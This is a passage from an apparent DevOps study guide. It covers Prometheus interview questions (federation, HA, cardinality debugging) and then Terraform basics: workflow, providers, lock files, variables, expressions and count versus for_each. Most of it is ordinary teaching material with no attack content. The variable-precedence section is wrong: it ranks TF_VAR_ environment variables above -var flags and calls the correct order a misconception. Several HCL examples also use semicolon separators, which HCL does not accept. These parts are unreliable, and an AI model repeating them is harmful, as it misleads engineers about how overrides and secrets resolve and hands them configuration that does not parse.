Normally a comparison like `> 0.8` filters series — those not meeting the condition are dropped from results entirely. The `bool` modifier changes this so Prometheus returns 1 for true and 0 for false, keeping all series in the output. This is useful for calculations like `avg(up == bool 1) * 100` which gives percentage of targets currently up, or for SLO burn rate calculations where you need a 0/1 signal.

---

## Architecture

**Q: What is the difference between kube-state-metrics, metrics-server, cAdvisor, and Node Exporter?**

kube-state-metrics watches the Kubernetes API for object state (deployments, pods, nodes, jobs) and exposes it as Prometheus metrics — is my deployment healthy, is a pod crash looping, is a node Ready. metrics-server collects CPU/memory from kubelets every 60s, stores only the latest value in memory, and serves the Kubernetes Metrics API (for `kubectl top` and HPA) — it does NOT expose `/metrics` and Prometheus cannot scrape it. cAdvisor is built into the kubelet and provides container-level resource metrics (`container_cpu_usage_seconds_total`, `container_memory_working_set_bytes`) that Prometheus scrapes. Node Exporter runs as a DaemonSet and provides detailed OS-level node metrics (CPU modes, memory details, disk, network, filesystem).

---

**Q: How would you set up Prometheus HA?**

Run two identical Prometheus servers with the same configuration. Both scrape the same targets independently and evaluate the same rules. Both send alerts to the same Alertmanager cluster. Alertmanager handles deduplication — it has built-in gossip-based clustering (deploy 3+ instances). Grafana queries either server (or load-balances). The limitation is data is not synchronized — slight timing differences exist. If one dies, its local data is lost. For data durability, add remote write to Thanos, Mimir, or VictoriaMetrics.

---

**Q: When would you use Thanos vs Mimir vs VictoriaMetrics?**

**Thanos:** When you have existing Prometheus servers you want to keep, need global querying across clusters, and scale is <50 Prometheus servers. Thanos wraps around Prometheus with a sidecar that uploads blocks to object storage. Minimal operational change from vanilla Prometheus.

**Mimir:** When you need multi-tenancy (shared cluster, isolated data per team), scale is 100s of Prometheus servers, or you are building monitoring-as-a-service. Prometheus remote-writes into Mimir. Complete tenant isolation via `X-Scope-OrgID` header with per-tenant limits.

**VictoriaMetrics:** When you need better performance and simpler operations — 5-10x less RAM, 3-4x less disk than Prometheus. Single binary drop-in replacement that accepts remote_write and speaks PromQL. Pragmatic choice when Thanos/Mimir complexity exceeds your scale requirements.

---

**Q: What is federation and what is its critical limitation?**

Federation allows one Prometheus to scrape the `/federate` endpoint of other Prometheus servers, pulling a subset of their metrics. The critical rule: NEVER federate raw high-cardinality metrics — ONLY federate pre-aggregated recording rules. If you federate raw metrics, the federation server gets the same cardinality as each regional server, defeating the purpose. The federation scrape can also time out on large datasets. Always create recording rules at the regional level (e.g., `job:http_requests:rate5m`) and federate only those aggregated metrics. Always use `honor_labels: true` on federation scrape configs to preserve original job/instance labels.

---

## Production Scenarios

**Q: Prometheus memory keeps growing. How do you investigate?**

Step 1: Check `prometheus_tsdb_head_series` — is it higher than expected? Multiply by 3,500 bytes and compare to `process_resident_memory_bytes`. Step 2: If the math does not add up, check for churn — `rate(prometheus_tsdb_head_series_created_total[1h]) * 3600` tells you new series per hour. Thousands per hour on stable infrastructure = churn problem. Step 3: Visit TSDB status page (`/api/v1/status/tsdb`), sort `labelValueCountByLabelName` descending — first label with >10k unique values is your suspect. Step 4: Identify which metrics carry the offending label using `count by (__name__) ({problematic_label!=""})`. Step 5: Fix with `metric_relabel_configs` — labeldrop for the bad label, or replace to normalize high-cardinality values like URL paths. Step 6: Verify — `scrape_samples_post_metric_relabeling` should drop relative to `scrape_samples_scraped`. Wait 4 hours for stale series to cycle out of Head Block. Step 7: Prevent — add `sample_limit` on all jobs, set cardinality growth alerts, create instrumentation guidelines prohibiting unbounded label values.

---

**Q: A team deployed a new service and Prometheus CPU spiked. What happened?**

Most likely the new service exposes metrics with a high-cardinality label (user_id, request_id, session token). Each unique label value creates a new series. Check `topk(10, count by (job) ({__name__=~".+"}))` to find which job contributes the most series. Then check `scrape_samples_scraped{job="the-new-service"}` — if it returns thousands of samples per scrape, inspect the `/metrics` endpoint of one pod directly with `curl`. Look for labels with unbounded values. Fix by adding `metric_relabel_configs` to drop or normalize the label, and work with the team to fix their instrumentation.

---

**Q: You need per-user metrics for billing but cannot afford the cardinality in Prometheus. What architecture?**

Use two separate pipelines. Keep Prometheus for low-cardinality operational metrics — request rates, latency histograms, error counts grouped by service/method/status without user_id. These handle alerting, SLO tracking, and capacity planning. For per-user billing data, bypass Prometheus entirely. Write per-user events to a system designed for high cardinality: ClickHouse, BigQuery, Druid, or Kafka → columnar store. These systems handle billions of rows with high-cardinality dimensions. A Prometheus recording rule can compute fleet-wide aggregates for billing totals without per-user series. Prometheus is optimized for the 1k–1M series range. Beyond that, specialized systems handle the workload better.

---

**Q: How do you safely roll out a metric_relabel_configs change?**

First, test the regex locally with `promtool` or on a staging Prometheus. Then add the rule and trigger a config reload (`/-/reload`). Monitor `scrape_samples_scraped` vs `scrape_samples_post_metric_relabeling` — the gap should increase by the number of samples being dropped. Check that no critical dashboards or alerts break by verifying the metrics they depend on still exist. If you made a mistake and dropped something important, the data is still in the TSDB for the retention period — queries against historical data still work. Only new scrapes are affected by the change.

---

**Q: What is the ALERTS metric and how do you use it?**

Every active alert in Prometheus is exposed as a time series called `ALERTS` with labels including `alertname`, `alertstate` (pending or firing), and any labels from the alert rule. You can query it like any metric:

```promql
# How many alerts are currently firing?
count(ALERTS{alertstate="firing"})

# Is a specific alert firing?
ALERTS{alertname="HighErrorRate", alertstate="firing"}

# Meta-alert: too many alerts firing
count(ALERTS{alertstate="firing"}) > 20
```

`ALERTS_FOR_STATE` tracks the timestamp when an alert entered pending state — useful for calculating how long an alert has been active.

# 1. TERRAFORM FUNDAMENTALS

---

## 1.1 What Is Terraform and IaC

### Concept

Terraform is an open-source Infrastructure as Code (IaC) tool by HashiCorp. It allows you to define, provision, and manage cloud infrastructure — VPCs, EC2 instances, RDS databases, IAM roles, S3 buckets — using declarative configuration files written in HCL (HashiCorp Configuration Language).

IaC philosophy: infrastructure is treated exactly like application code. It lives in Git, goes through pull request review, is tested in CI, and is deployed through automated pipelines.

### Why It Is Used

Before IaC, engineers provisioned infrastructure manually through the AWS Console. This led to snowflake servers (every environment slightly different), no audit trail (who created this S3 bucket and why?), environment drift (dev, staging, prod silently diverging), and painful disaster recovery (rebuilding infra took days).

Terraform solves these problems through reproducibility (same config produces identical infra every time), version control (changes go through Git and PRs), automation (CI/CD pipelines provision without human intervention), self-documentation (the code IS the documentation), drift detection (`terraform plan` shows when reality diverges from declared state), and disaster recovery (rebuild everything with `terraform apply`).

### How It Works

Terraform follows a declarative model. You describe the desired end state, and Terraform computes how to get there.

```hcl
# Declarative — describe WHAT you want
resource "aws_instance" "web" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t3.medium"
  count         = 3
}
```

Terraform Core reads your `.tf` files (desired state), compares them against the state file (current known state), refreshes real-world state from AWS APIs, and computes a diff showing exactly what needs to change.

### Industry Usage

In production, Terraform is the foundational layer of the infrastructure stack. A typical cloud-native company uses Terraform for provisioning (VPC, EKS, RDS, S3, IAM), Ansible or cloud-init for OS-level configuration, Helm/ArgoCD for Kubernetes application deployment, and Sentinel or OPA for policy enforcement.

Every change to infrastructure goes through a pull request. CI runs `terraform plan` automatically. A human reviews the plan output before merge. On merge to main, CI runs `terraform apply` with the saved plan artifact. This workflow ensures that infrastructure changes get the same rigor as code changes.

Key principles to remember: Terraform is idempotent (running it 10 times produces the same result as running it once), it handles Day 1 (initial provisioning) and Day 2 (ongoing operations, drift detection, scaling) equally well, and state is the source of truth — if state and reality diverge, Terraform goes by state.

### Example — Production VPC

```hcl
# terraform/environments/prod/main.tf
# This file, in a Git repo, IS your production network
# Any engineer can read it and understand exactly what exists
# Changes require a PR. CI runs terraform plan on every PR.

terraform {
  required_version = ">= 1.5.0"
  backend "s3" {
    bucket         = "mycompany-terraform-state"
    key            = "prod/vpc/terraform.tfstate"
    region         = "us-east-1"
    encrypt        = true
    kms_key_id     = "alias/terraform-state-key"
    dynamodb_table = "terraform-locks"
  }
}

module "vpc" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "5.1.0"

  name = "prod-vpc"
  cidr = "10.0.0.0/16"

  azs             = ["us-east-1a", "us-east-1b", "us-east-1c"]
  private_subnets = ["10.0.1.0/24", "10.0.2.0/24", "10.0.3.0/24"]
  public_subnets  = ["10.0.101.0/24", "10.0.102.0/24", "10.0.103.0/24"]

  enable_nat_gateway = true
  single_nat_gateway = false  # HA: one NAT per AZ in prod

  tags = {
    Environment = "production"
    ManagedBy   = "terraform"
    Team        = "platform"
  }
}
```

### Important Details

IaC does not prevent all human error — Terraform applies whatever you write. Writing `count = 0` deletes all your instances. Code must be reviewed. Not everything should be in Terraform — transient resources or things that change frequently (ECS task definitions updated by CI/CD) might be better managed by application code. Terraform is eventually consistent — after apply, some resources (DNS propagation, IAM policy attachment) take time to be ready. Your code may need `depends_on` or `time_sleep` workarounds.

### Interview Insights

**Q: What is the difference between declarative and imperative IaC?**
Declarative means you describe the desired end state and the tool figures out how to achieve it (Terraform, CloudFormation). Imperative means you write step-by-step instructions (Bash scripts, Ansible playbooks). Declarative wins for infrastructure because it handles idempotency automatically — if a resource already exists, Terraform will not recreate it.

**Q: What is idempotency and why does it matter?**
Idempotency means running the same operation multiple times produces the same result. You can safely run `terraform apply` repeatedly without creating duplicates or side effects. This is critical for CI/CD automation and disaster recovery.

---

## 1.2 Terraform vs Other IaC Tools

### Concept

Terraform competes with CloudFormation, Pulumi, Ansible, and AWS CDK. Each has different strengths.

### Key Comparisons

**Terraform vs CloudFormation:** Terraform is multi-cloud and uses HCL (more readable than JSON/YAML). CloudFormation is AWS-only but manages state internally and provides built-in rollback. Use CloudFormation in strict AWS-compliance shops; use Terraform for multi-cloud, community modules, and HCL expressiveness.

**Terraform vs Ansible:** They solve different problems. Terraform provisions infrastructure (creates EC2, VPCs, databases). Ansible configures what is running on that infrastructure (installs packages, manages config files). Best practice: use both together. Terraform creates the resource, Ansible configures it.

**Terraform vs Pulumi:** Pulumi uses real programming languages (TypeScript, Python, Go). Terraform uses HCL, which has a lower barrier to entry for operators. Pulumi suits teams with strong software engineering backgrounds who need complex logic that `for_each`/`count` cannot express. Most DevOps teams prefer Terraform due to its simpler syntax and larger ecosystem.

### Interview Insights

**Q: Can Terraform replace Ansible?**
No. They solve different problems. The idiomatic pattern is to use both: Terraform provisions the resource, an Ansible playbook or cloud-init script configures it. Trying to use Terraform's `remote-exec` provisioner for OS configuration is an anti-pattern.

---

## 1.3 Core Workflow — init, plan, apply, destroy

### Concept

Terraform's workflow deliberately separates setup, planning, and execution for safety.

### How It Works

**`terraform init`** downloads providers from registry.terraform.io into `.terraform/providers/`, downloads modules into `.terraform/modules/`, initializes the configured backend (S3, Terraform Cloud), and creates/updates `.terraform.lock.hcl`.

```bash
terraform init                    # Standard initialization
terraform init -upgrade           # Upgrade providers to latest allowed version
terraform init -reconfigure       # Force reconfigure backend
terraform init -migrate-state     # Migrate state to new backend
```

**`terraform plan`** reads all `.tf` files, reads current state from the backend, calls provider APIs to refresh resource states, builds a dependency graph (DAG), computes the diff between desired and current state, and outputs a detailed execution plan showing creates (+), updates (~), destroys (-), and replacements (-/+).

```bash
terraform plan                         # Interactive preview
terraform plan -out=tfplan             # Save plan to file (essential for CI/CD)
terraform plan -var-file="prod.tfvars" # Pass environment-specific variables
terraform plan -target=aws_instance.web  # Plan specific resource only (emergencies)
terraform plan -detailed-exitcode      # Exit 0=no changes, 1=error, 2=changes pending
```

**`terraform apply`** optionally re-runs plan (if no saved plan), acquires state lock, walks the dependency graph in parallel (default 10 concurrent operations), creates/updates/destroys resources via provider APIs, updates state after each successful resource operation, and releases the state lock.

```bash
terraform apply                  # Interactive — shows plan, asks yes/no
terraform apply tfplan           # Apply a saved plan file (CI/CD)
terraform apply -auto-approve    # No prompt (CI/CD only, never manual prod)
terraform apply -parallelism=20  # Increase concurrent API calls
```

**`terraform destroy`** creates a destroy plan, prompts for confirmation, destroys resources in reverse dependency order, and removes entries from state.

### Industry Usage

In production CI/CD pipelines, the workflow is strictly separated:

```bash
# On PR open — plan only
terraform init
terraform validate
terraform plan -out=tfplan    # Save plan as artifact

# Human reviews plan output in the PR

# On PR merge to main — apply the reviewed plan
terraform apply tfplan         # Apply EXACT plan that was reviewed
```

The critical rule: always use `terraform plan -out=tfplan` followed by `terraform apply tfplan` in CI/CD. This guarantees that what was reviewed is what gets applied. Without the saved plan, infrastructure could change between plan and apply.

### Important Details

`-auto-approve` in production is dangerous and must always be gated by a human approval step or policy engine. `-target` is a last resort — targeting specific resources creates state inconsistencies and should only be used for emergencies. Plan files are binary and environment-specific — they cannot be shared across machines with different provider versions. `init` must be re-run after changing backend config, adding new providers, or updating module sources.

### Interview Insights

**Q: What happens if you run apply without plan first?**
Terraform runs a plan internally and shows it for confirmation. In production, always use `plan -out=tfplan` then `apply tfplan` so the plan is a reviewable artifact.

**Q: Can plan output ever be wrong?**
Yes. If infrastructure changes between plan and apply (manual changes, async operations completing), the apply may differ from the plan. This is why saved plan files with a short plan-to-apply window are best practice.

---

## 1.4 Terraform Architecture — CLI, Core, Providers, State

### Concept

Terraform has four components: CLI (what you type), Core (the brain — reads config, builds DAG, computes diff), Providers (the hands — make API calls to AWS), and State (the memory — tracks what exists).

### How It Works

Terraform Core is written in Go. It parses HCL, loads state, calls providers to refresh resource states, builds a Directed Acyclic Graph (DAG) of all resources, computes the diff, and walks the graph calling provider CRUD operations in parallel.

Providers are separate Go binaries that communicate with Core via gRPC. Each provider knows how to authenticate with a specific API, defines which resources and data sources it supports, translates Terraform's CRUD operations into real API calls, and validates resource configurations.

The DAG determines execution order. Resources that reference each other's attributes form dependency edges. Independent resources execute in parallel (up to the parallelism limit).

```
aws_vpc.main ──► aws_subnet.private ──► aws_instance.web
                                    └──► aws_instance.app
```

`aws_instance.web` and `aws_instance.app` run in parallel because they both only depend on `aws_subnet.private`.

### Interview Insights

**Q: What is a provider in Terraform?**
A provider is a plugin (separate Go binary) that communicates with Core via gRPC. It translates Terraform's resource operations into real API calls. Core starts the provider as a subprocess, sends gRPC requests like "create this resource with these params," and the provider calls the AWS API and returns the resource ID and attributes.

## 1.5 HCL Syntax — Blocks, Arguments, Expressions

### Concept

HCL has three core constructs: blocks (containers with type, optional labels, and body), arguments (key-value assignments inside blocks), and expressions (values that can include references, interpolation, conditionals, and loops).

### Key Block Types

```hcl
# terraform block — configure Terraform itself
terraform {
  required_version = ">= 1.5.0"
  required_providers {
    aws = { source = "hashicorp/aws", version = "~> 5.0" }
  }
  backend "s3" { ... }
}

# provider block — configure a cloud provider
provider "aws" { region = "us-east-1" }

# resource block — declare infrastructure
resource "aws_vpc" "main" { cidr_block = "10.0.0.0/16" }

# data block — read existing infrastructure
data "aws_ami" "ubuntu" {
  most_recent = true
  filter { name = "name"; values = ["ubuntu/images/*22.04*"] }
}

# variable block — input parameters
variable "environment" { type = string; default = "dev" }

# output block — export values
output "vpc_id" { value = aws_vpc.main.id }

# locals block — computed local values
locals {
  common_tags = { ManagedBy = "terraform"; Environment = var.environment }
}
```

### Type System

Primitives: `string`, `number`, `bool`. Collections: `list(type)` (ordered, allows duplicates), `set(type)` (unordered, unique), `map(type)` (key-value, all values same type). Structural: `object({...})` (named attributes, mixed types), `tuple([...])` (fixed-length, mixed types).

### Important Details

`null` is a valid value — assigning it tells Terraform to use the provider's default. String interpolation `"${}"` is not always needed — `vpc_id = aws_vpc.main.id` is cleaner than `vpc_id = "${aws_vpc.main.id}"`. Block labels must be unique — two `resource "aws_instance" "web"` blocks in the same module will error.

---

## 1.6 .terraform.lock.hcl — Dependency Lock File

### Concept

`.terraform.lock.hcl` is a dependency lock file for providers. It records the exact version and cryptographic checksums of every provider used. Think of it like `package-lock.json` for Node.js.

### Why It Is Used

Without a lock file, `version = "~> 5.0"` could resolve to `5.1.0` today and `5.3.0` next month. Different team members and CI environments would get different provider versions, creating reproducibility problems.

### How It Works

The lock file records the exact version pinned (e.g., `5.1.0`), the original version constraint (e.g., `~> 5.0`), and cryptographic hashes of the provider binary for multiple platforms (`h1:` for extracted binary, `zh:` for zip file).

On subsequent `terraform init`, Terraform reads the lock file, downloads the exact locked version, and verifies the hash matches. If the hash does not match (supply chain attack protection), init fails.

```bash
# Upgrade providers (updates lock file)
terraform init -upgrade

# Add hashes for CI platform (Mac dev + Linux CI)
terraform providers lock \
  -platform=linux_amd64 \
  -platform=darwin_arm64
```

### Industry Usage

**Always commit `.terraform.lock.hcl` to Git.** The `.terraform/` directory goes in `.gitignore`. The lock file does NOT.

```gitignore
.terraform/             # Provider binaries — regenerated by init
*.tfstate               # State files — in remote backend
*.tfstate.backup
.terraform.tfvars       # Sensitive vars — never in Git
# DO NOT ignore .terraform.lock.hcl
```

A common CI issue: developer on Mac M1 (darwin_arm64) runs init locally. Lock file only has darwin_arm64 hashes. CI on linux_amd64 fails with hash mismatch. Fix: run `terraform providers lock` with both platforms.

### Important Details

The lock file only locks providers, not modules. Module versions are pinned via the `version` parameter in the module source. `-upgrade` updates the lock file intentionally but can surprise people — running it in CI without reviewing the lock file diff is dangerous.

### Interview Insights

**Q: Should `.terraform.lock.hcl` be committed to Git?**
Yes, always. It ensures reproducibility (everyone uses the same provider version) and supply chain security (hash verification detects tampered binaries).

# 2. PROVIDERS

---

## 2.1 Provider Internals

### Concept

A provider is a plugin that teaches Terraform how to talk to a specific API. Without providers, Terraform Core has no idea what an EC2 instance or S3 bucket is.

### How It Works

Providers are separate OS processes that Core communicates with via gRPC. When you run `terraform init`, provider binaries are downloaded to `.terraform/providers/`. During plan/apply, Core starts the provider as a subprocess, sends gRPC requests (GetSchema, ReadResource, CreateResource, etc.), and the provider translates those into AWS API calls.

### Provider Configuration

```hcl
terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

provider "aws" {
  region  = "us-east-1"
  profile = "production"
}
```

### Industry Usage

In production, providers are always version-constrained. Root modules use tight constraints (`~> 5.0` or exact pins). Reusable modules use permissive constraints (`>= 4.0, < 6.0`) so consumers can choose their version.

Authentication in production never uses hardcoded credentials. The hierarchy is: OIDC (for CI/CD — no stored secrets), IAM instance profiles (for EC2-based runners), environment variables (for local dev with SSO), and shared credentials file as last resort.

```hcl
# Production: OIDC-based, no stored credentials
provider "aws" {
  region = "us-east-1"
  # Credentials come from CI/CD OIDC token exchange
  # No access_key_id or secret_access_key anywhere
}
```

---

## 2.2 Provider Aliases — Multi-Region and Multi-Account

### Concept

Provider aliases let you define multiple configurations of the same provider — different regions, different accounts, different credentials.

### Why It Is Used

The most common real-world scenario: CloudFront requires ACM certificates in `us-east-1`, but your main infrastructure lives in a different region. You need two AWS provider instances.

### How It Works

```hcl
# Default provider — main region
provider "aws" {
  region = "eu-west-1"
}

# Aliased provider — for CloudFront ACM certs
provider "aws" {
  alias  = "us_east_1"
  region = "us-east-1"
}

# Aliased provider — different AWS account
provider "aws" {
  alias  = "prod_account"
  region = "eu-west-1"
  assume_role {
    role_arn = "arn:aws:iam::999999999999:role/TerraformRole"
  }
}

# Resources use aliased providers explicitly
resource "aws_acm_certificate" "cloudfront" {
  provider          = aws.us_east_1
  domain_name       = "example.com"
  validation_method = "DNS"
}
```

### Industry Usage — Passing Aliases to Modules

Modules do NOT inherit provider aliases automatically. You must explicitly pass them:

```hcl
# Root module
module "cdn" {
  source = "./modules/cdn"
  providers = {
    aws           = aws
    aws.us_east_1 = aws.us_east_1
  }
}

# Inside module — declare expected aliases
terraform {
  required_providers {
    aws = {
      source                = "hashicorp/aws"
      version               = "~> 5.0"
      configuration_aliases = [aws.us_east_1]
    }
  }
}
```

### Important Details

Forgetting to pass aliases into modules is the number one mistake — the module silently uses the default provider, which may point at the wrong region or account. Each alias starts a separate provider process. `for_each` on provider aliases is not supported — you must define each alias explicitly. If you rename an alias, Terraform thinks resources need to be recreated because the state records which alias manages each resource.

### Interview Insights

**Q: When would you use provider aliases?**
Three scenarios: multi-region (ACM for CloudFront must be in us-east-1), multi-account (managing resources across AWS accounts using AssumeRole), and different provider configurations for different resource groups.

---

## 2.3 Provider Caching and Plugin Mirrors

### Concept

Every `terraform init` downloads provider binaries from the registry. The AWS provider alone is 100MB+. Caching and mirrors eliminate redundant downloads.

### Industry Usage

**Plugin cache (simplest):** Set `TF_PLUGIN_CACHE_DIR` environment variable. First init downloads and caches. Subsequent inits use cached binaries via symlink.

```bash
export TF_PLUGIN_CACHE_DIR="$HOME/.terraform.d/plugin-cache"
```

**Filesystem mirror (air-gapped environments):** Configure a local directory as the provider source in `~/.terraformrc`:

```hcl
provider_installation {
  filesystem_mirror {
    path    = "/opt/terraform/providers"
    include = ["registry.terraform.io/*/*"]
  }
  direct {
    exclude = ["registry.terraform.io/*/*"]
  }
}
```

**Network mirror (enterprise):** Use Artifactory or Nexus as a proxy registry. All provider downloads go through the corporate mirror for security and compliance.

In CI/CD pipelines, cache the `.terraform/providers/` directory between runs using your CI platform's cache mechanism (GitHub Actions cache, GitLab CI cache).

# 3. RESOURCES AND DEPENDENCIES

---

## 3.1 Resources, Data Sources, and the Dependency Graph

### Concept

Resources are the fundamental building blocks — each `resource` block declares one piece of infrastructure. Data sources (`data` blocks) read existing infrastructure without managing it. Terraform builds a Directed Acyclic Graph (DAG) to determine execution order.

### How It Works

**Implicit dependencies** are created automatically when one resource references another's attribute:

```hcl
resource "aws_vpc" "main" {
  cidr_block = "10.0.0.0/16"
}

resource "aws_subnet" "private" {
  vpc_id     = aws_vpc.main.id    # Implicit dependency — subnet waits for VPC
  cidr_block = "10.0.1.0/24"
}
```

Terraform creates the VPC first, then the subnet. Independent resources run in parallel (default 10 concurrent operations).

**Explicit dependencies** (`depends_on`) are needed when a dependency exists through side effects, not attribute references:

```hcl
resource "aws_iam_role_policy_attachment" "lambda_basic" {
  role       = aws_iam_role.lambda.name
  policy_arn = "arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole"
}

resource "aws_lambda_function" "processor" {
  function_name = "data-processor"
  role          = aws_iam_role.lambda.arn    # Implicit dep on role
  handler       = "index.handler"
  runtime       = "nodejs18.x"

  # NEEDED: Lambda can be created before policy attachment completes
  # AWS IAM is eventually consistent
  depends_on = [aws_iam_role_policy_attachment.lambda_basic]
}
```

### When depends_on IS Needed

IAM propagation delays (policy attachment must complete before resource uses the role), resource behavior side effects (bucket policy must be set before CloudFront tries to access the bucket), VPC endpoint dependencies (endpoint should exist before instances start routing through it), and S3 notifications needing Lambda permissions set first.

### When depends_on is NOT Needed (Common Misuse)

```hcl
# WRONG — redundant, implicit dependency already exists
resource "aws_subnet" "private" {
  vpc_id     = aws_vpc.main.id       # Already creates implicit dependency
  depends_on = [aws_vpc.main]         # REDUNDANT — remove this
}
```

Redundant `depends_on` serializes operations that could run in parallel, slows down apply, and makes the dependency graph harder to reason about.

### Industry Usage

Use `terraform graph | dot -Tpng > graph.png` to visualize the dependency graph. In production, most dependencies are implicit through attribute references. Reserve `depends_on` for genuine side-effect dependencies, and always add a comment explaining WHY it is needed.

### Interview Insights

**Q: How does Terraform determine resource creation order?**
Terraform builds a DAG where resources are nodes and dependencies are directed edges. Attribute references create implicit edges. Independent resources run in parallel up to the parallelism limit. On destroy, the graph is traversed in reverse.

**Q: Can you create circular dependencies?**
Terraform detects cycles and immediately errors with a "Cycle" error. The most common cycle is security groups with inline rules referencing each other. Fix: separate group creation from rule creation using `aws_security_group_rule` resources.

---

## 3.2 Resource Addressing and terraform import

### Concept

Every resource in Terraform has a unique address: `resource_type.resource_name` (e.g., `aws_instance.web`). Resources can be imported into state from existing infrastructure.

### How It Works

```hcl
# Terraform 1.5+ import blocks (declarative, codified)
import {
  to = aws_instance.web
  id = "i-0a1b2c3d4e5f67890"
}

# Legacy CLI import (imperative, not in Git)
terraform import aws_instance.web i-0a1b2c3d4e5f67890
```

### Industry Usage

Import blocks (1.5+) are preferred over CLI imports because they are codified in configuration, reviewable in PRs, and repeatable across environments. After import, always run `terraform plan` to verify the imported configuration matches reality. Adjust the resource block until plan shows no changes.

---

---

# 4. VARIABLES AND EXPRESSIONS

---

## 4.1 Input Variables

### Concept

Variables parameterize configurations. They have a type, optional default, description, validation, and sensitivity flag.

### How It Works

```hcl
variable "environment" {
  type        = string
  description = "Deployment environment"
  validation {
    condition     = contains(["dev", "staging", "prod"], var.environment)
    error_message = "Must be dev, staging, or prod."
  }
}

variable "instance_type" {
  type    = string
  default = "t3.medium"
}

variable "db_password" {
  type      = string
  sensitive = true    # Redacts from CLI output ONLY — still plaintext in state
}
```

### Industry Usage

In production, variables are supplied through layered tfvars files and environment variables:

```bash
# CI/CD pattern: base + environment + secrets
terraform apply \
  -var-file="environments/base.tfvars" \
  -var-file="environments/${ENV}.tfvars" \
  -var="image_tag=${DOCKER_IMAGE_TAG}"

# Secrets via environment variables (never in files)
export TF_VAR_db_password="${DB_PASSWORD}"
```

### Important Details — Variable Precedence

Variables resolve in this priority order (lowest to highest):

1. Default value in variable block (lowest)
2. `terraform.tfvars` (auto-loaded)
3. `terraform.tfvars.json` (auto-loaded)
4. `*.auto.tfvars` files (alphabetical order, auto-loaded)
5. `*.auto.tfvars.json` files (alphabetical order)
6. `-var-file` flag
7. `-var` inline flag
8. `TF_VAR_` environment variables (highest)

Common misconception: many think `-var` overrides `TF_VAR_`. It does not. Environment variables have the HIGHEST priority. This matters for CI/CD: set secrets as `TF_VAR_` and they cannot be accidentally overridden by tfvars files.

### Interview Insights

**Q: What is the highest-priority way to set a variable?**
`TF_VAR_<name>` environment variables. They override everything including `-var` flags. Important for CI/CD secret injection.

**Q: What is `.auto.tfvars`?**
Files matching `*.auto.tfvars` are automatically loaded without needing a `-var-file` flag. They are loaded in alphabetical order. Adding one to a directory can silently override values — always check for existing `.auto.tfvars` files when debugging unexpected variable values.

---

## 4.2 Locals — Computed Internal Values

### Concept

Locals are named computed expressions within a module. Unlike variables, they cannot be set from outside and can reference other locals, variables, and resource attributes.

### How It Works

```hcl
locals {
  name_prefix = "${var.environment}-${var.project}"
  common_tags = {
    Environment = var.environment
    ManagedBy   = "terraform"
    Project     = var.project
  }
}

resource "aws_vpc" "main" {
  cidr_block = "10.0.0.0/16"
  tags       = merge(local.common_tags, { Name = "${local.name_prefix}-vpc" })
}
```

### Industry Usage — Environment Config Maps

```hcl
locals {
  env_config = {
    dev     = { instance_type = "t3.micro",  min_size = 1,  multi_az = false }
    staging = { instance_type = "t3.medium", min_size = 2,  multi_az = true  }
    prod    = { instance_type = "t3.large",  min_size = 3,  multi_az = true  }
  }
  config = local.env_config[var.environment]
}
```

### Decision Framework

Use a **variable** when the value comes from outside the module (caller configures it). Use a **local** when it is a derived expression you want to reuse internally. Use an **output** when callers need to see the value.

---

## 4.3 Outputs

### Concept

Outputs expose values from a module to its caller. They serve as the module's public API and enable cross-stack communication.

### How It Works

```hcl
output "vpc_id" {
  description = "ID of the created VPC"
  value       = aws_vpc.main.id
}

output "private_subnet_ids" {
  description = "IDs of private subnets"
  value       = aws_subnet.private[*].id
}

output "db_connection_string" {
  description = "Database connection string"
  value       = aws_db_instance.main.endpoint
  sensitive   = true    # Redacts from CLI output
}
```

### Industry Usage

Outputs are consumed in three ways: by parent modules (`module.vpc.vpc_id`), by other state files via `terraform_remote_state` or SSM Parameter Store (cross-stack references), and displayed after `terraform apply` for operators to see.

---

## 4.4 Expressions and Functions

### Concept

Terraform provides conditionals, for-expressions, and a rich function library for transforming data.

### Key Patterns

```hcl
# Conditional expression
resource "aws_eip" "nat" {
  count  = var.environment == "prod" ? 3 : 1
  domain = "vpc"
}

# For expression — transform lists/maps
locals {
  upper_names = [for name in var.names : upper(name)]
  name_map    = { for s in var.servers : s.name => s }

  # Filter with if clause
  prod_servers = { for s in var.servers : s.name => s if s.env == "prod" }
}

# Splat expressions — shorthand for collecting attributes
output "instance_ids" {
  value = aws_instance.web[*].id             # All instance IDs
}
output "private_ips" {
  value = aws_instance.web[*].private_ip     # All private IPs
}

# Dynamic blocks — generate repeated nested blocks
resource "aws_security_group" "web" {
  name   = "web-sg"
  vpc_id = aws_vpc.main.id

  dynamic "ingress" {
    for_each = var.ingress_rules
    content {
      from_port   = ingress.value.port
      to_port     = ingress.value.port
      protocol    = "tcp"
      cidr_blocks = ingress.value.cidrs
      description = ingress.value.description
    }
  }

  # Dynamic blocks can also iterate over maps
  dynamic "egress" {
    for_each = var.egress_rules
    content {
      from_port   = egress.value.port
      to_port     = egress.value.port
      protocol    = egress.value.protocol
      cidr_blocks = egress.value.cidrs
    }
  }
}

# Commonly used functions
cidrsubnet("10.0.0.0/16", 8, 1)                  # "10.0.1.0/24"
merge(local.common_tags, { Name = "x" })          # Merge maps
lookup(var.config, "key", "default")               # Map lookup with default
templatefile("script.sh.tpl", { port = 8080 })    # Template rendering
try(var.config.optional_key, "fallback")           # Safe access with fallback
coalesce(var.custom_name, "${var.env}-default")    # First non-null/empty value
flatten([var.public_subnets, var.private_subnets]) # Flatten nested lists
zipmap(var.keys, var.values)                       # Create map from two lists
format("arn:aws:s3:::%s/*", var.bucket_name)       # String formatting
jsonencode({ key = "value" })                      # HCL to JSON (prevents perpetual diffs)
```

### Important Details on Dynamic Blocks

Dynamic blocks should be used sparingly. They are powerful for generating security group rules, IAM policy statements, and similar repeated structures, but overuse makes configs harder to read. If a block is used 2-3 times, hardcoded blocks are more readable. Dynamic blocks are best for cases where the iteration set comes from a variable (configurable number of rules).

`for_each` inside a dynamic block uses `<block_name>.key` and `<block_name>.value`, not `each.key`/`each.value` like resource-level `for_each`.

# 5. META-ARGUMENTS

---

## 5.1 count vs for_each

### Concept

Both create multiple instances of a resource. `count` uses numeric indexes. `for_each` uses stable string keys. This difference is fundamental and determines which to use.

### Why It Matters — The Critical Difference

```hcl
# count approach — problematic for named resources
variable "team" { default = ["alice", "bob", "charlie"] }

resource "aws_iam_user" "team" {
  count = length(var.team)
  name  = var.team[count.index]
}
